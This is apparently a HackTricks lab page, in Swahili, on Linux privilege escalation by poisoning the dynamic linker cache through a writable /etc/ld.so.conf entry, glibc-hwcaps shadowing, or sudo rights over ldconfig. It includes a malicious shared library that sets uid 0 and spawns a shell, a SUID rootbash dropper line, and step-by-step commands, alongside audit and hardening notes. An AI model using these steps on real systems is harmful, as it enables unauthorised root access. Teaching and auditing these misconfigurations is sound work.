# ld.so privesc exploit example

Ukurasa huu ni lab inayolenga poisoning ya **system linker cache kupitia `/etc/ld.so.conf` au `ldconfig`**. Kwa missing-library injection, `RPATH`/`RUNPATH` zinazoweza kuandikwa, `LD_PRELOAD`, na matumizi mengine ya generic SUID linker abuse, tazama [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Tayarisha mazingira

Katika sehemu ifuatayo unaweza kupata code ya files tutakazotumia kutayarisha mazingira.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda hiyo hiyo
2. **Compile** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` hadi `/usr/lib` na refresh cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kagua mazingira

Hakikisha kuwa _libcustom.so_ **inapakiwa** kutoka _/usr/lib_ na kwamba unaweza **ku-execute** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri muhimu za triage

Unaposhambulia **target** halisi, thibitisha **jina kamili la library** ambalo binary inahitaji, kile ambacho loader **inatatua kwa sasa**, na ni paths zipi zilizosanidiwa zinaweza kuandikwa bila kubadilisha cache inayotumika.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Tumia `ldd` pekee kwenye executable **inayoaminika**. Baadhi ya implementations au ELF interpreters zisizo za kawaida zinaweza kuifanya itekeleze code inayodhibitiwa na attacker; `objdump -p ./file | grep NEEDED` huorodhesha dependencies za moja kwa moja kwa usalama. Kwa target inayoaminika, kuendesha interpreter iliyogunduliwa na `--list` huonyesha resolution halisi.<sup>[[4]](#references)</sup>

Baadhi ya gotchas muhimu:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu redirection hufanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries za **SUID/privileged** huendeshwa katika **secure-execution mode**: `LD_LIBRARY_PATH`
hupuuzwa, huku `LD_PRELOAD` ikiwa na vikwazo (majina yenye slash hupuuza, na libraries zilizowekewa alama ya setuid pekee katika directories za kawaida ndizo zinaweza kupreloadiwa). Mara root inapoendesha `ldconfig`, directories zilizoorodheshwa katika
`/etc/ld.so.conf` zinaweza kuingia kwenye `/etc/ld.so.cache`, hivyo misconfiguration hii bado inaweza kuathiri programs za privileged.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` pia hupuuza katika secure-execution mode isipokuwa `/etc/suid-debug` iwepo, kwa hiyo kusanya trace yake kutoka kwenye run inayolingana isiyo ya SUID badala ya kutarajia output kutoka kwenye execution ya privileged.<sup>[[1]](#references)</sup>
- Kwenye glibc 2.33 na mpya zaidi, dynamic loader pia hutoa
`--list-diagnostics`, ambayo huchapisha loader diagnostics zinazoweza kusomeka na machine pamoja na taarifa za built-in search-path wakati hijack haifanyi kazi kama ilivyotarajiwa.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache and SONAME constraints

`ldconfig` hai-cache kila file ya kiholela katika directory iliyosanidiwa: huchunguza ELF headers, hutambua majina yanayolingana na `lib*.so*` au `ld-*.so*`, na hutazamia chain ya kawaida ya `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Kwa hiyo, object iliyoingizwa lazima iwe na target architecture/class, jina kamili la `DT_NEEDED` (kwa kawaida `DT_SONAME` yake), na symbols/versions zozote ambazo victim huresolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefer library maalum kwa target kama katika mfano huu. Kuweka shadow ya SONAME ya kawaida kwa object isiyokamilika kunaweza kuharibu kila process inayo-resolve SONAME hiyo kabla target ya privileged iliyokusudiwa ku-run.<sup>[[3]](#references)</sup>

## Exploit

Katika scenario hii, tuseme administrator ameongeza entry iliyo vulnerable kwenye
file iliyo chini ya `/etc/ld.so.conf.d/` ambayo imejumuishwa na
`/etc/ld.so.conf` ya system.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda iliyo katika hatari ni _/home/ubuntu/lib_ (ambapo tuna access ya kuandika).\
**Download na compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye mapendeleo) kutekeleza **binary** iliyo hatarini baadaye, kwa kawaida ni bora kuacha **artifact** inayomilikiwa na **root** badala ya kuanzisha **interactive shell**. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya utekelezaji wenye ruhusa za juu kufanyika, unaweza kutumia `/tmp/rootbash -p`.

Kwa kuwa sasa tume **unda library hasidi ya libcustom ndani ya** path iliyosanidiwa vibaya, cache ya chaguo-msingi lazima ijengwe upya kupitia uendeshaji wa **`ldconfig` wenye ruhusa za juu** uliofanikiwa. Kuwasha upya mfumo husaidia tu pale ambapo mchakato wa ndani wa kuwasha mfumo huiendesha; vinginevyo, subiri hatua ya administrator au tumia sheria ya sudo isiyo salama ikiwa ipo.<sup>[[2]](#references)</sup>

Baada ya hili kutokea, **hakikisha tena** ni wapi executable ya `sharedvuln` inapakia library ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, **inapakia kutoka `/home/ubuntu/lib`** na mtumiaji yeyote akiitekeleza, shell itatekelezwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatujaongeza privileges, lakini kwa kurekebisha commands zinazotekelezwa na **kusubiri root au mtumiaji mwingine mwenye privileges atekeleze binary yenye vulnerability**, tutaweza kufanya privilege escalation.

### Ya kisasa `glibc-hwcaps` shadowing

Tangu glibc 2.33, loader inaweza kupendelea libraries zilizoboreshwa zilizo chini ya `glibc-hwcaps/<level>/` ndani ya **kila saraka ya kutafuta libraries**. Kwa hivyo, kukagua `/home/ubuntu/lib` pekee haitoshi: subdirectory inayoweza kuandikwa na inayoendana, kama `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, inaweza kufanya shadowing ya base library baada ya `ldconfig` kui-index, huku CPUs nyingine zikiendelea kutumia base object. Hii pia hutoa hijack inayochagua architecture, ambayo inaweza kukosekana validation inapofanywa kwenye CPU tofauti.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mwongozo wa sasa wa glibc hardening unapendekeza kuepuka SONAMEs zinazorudiwa, search locations zisizo za default, na objects zilizo katika subdirectories za `glibc-hwcaps`. Kwa mtazamo wa audit, tumia ukaguzi wa ownership na writeability kwa kujirudia kwenye directories zilizosanidiwa na vipengele vyake vya parent path.<sup>[[3]](#references)</sup>

### Misanidi mingine isiyo sahihi - Vuln ileile

Katika mfano uliotangulia, tulitengeneza misconfiguration ambapo administrator **aliweka folder isiyo na privileges ndani ya configuration file iliyo ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna misanidi mingine isiyo sahihi inayoweza kusababisha vulnerability ileile: ikiwa una **write permissions** katika **config file** iliyopakiwa, unaweza kuunda file katika directory ya `/etc/ld.so.conf.d/` iliyo writable, au unaweza kuandika kwenye `/etc/ld.so.conf`, unaweza kusanidi na kutumia vulnerability ileile.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**.\
Unaweza kuielekeza `ldconfig` **ni configuration file ipi isomwe** kwa kutumia `-f`, hivyo file inayotaja directories zinazodhibitiwa na attacker inaweza kufanya `ldconfig` iongeze folders hizo kwenye cache.<sup>[[2]](#references)</sup>\
Kwa hiyo, tuunde files na folders zinazohitajika kupakia "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa kwenye **exploit ya awali**, **tengeneza library hasidi ndani ya `/tmp`**.\
Na mwishowe, hebu tupakie path na tuchunguze binary inapakia library kutoka wapi:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na sudo privileges juu ya `ldconfig` unaweza kutumia vulnerability hiyo hiyo.** Maelezo ya options ni muhimu unapokagua sudo rule yenye vikwazo: `-f` huchagua configuration nyingine lakini bado huunda upya `/etc/ld.so.cache`; `-C` huelekeza cache mahali pengine; `-N` huzuia cache kujengwa upya; na `-X` huzuia link updates lakini **bado huunda upya cache isipokuwa itumike pamoja na `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Uimarishaji wa Dynamic Linker - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Utambuzi wa Dynamic Linker (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
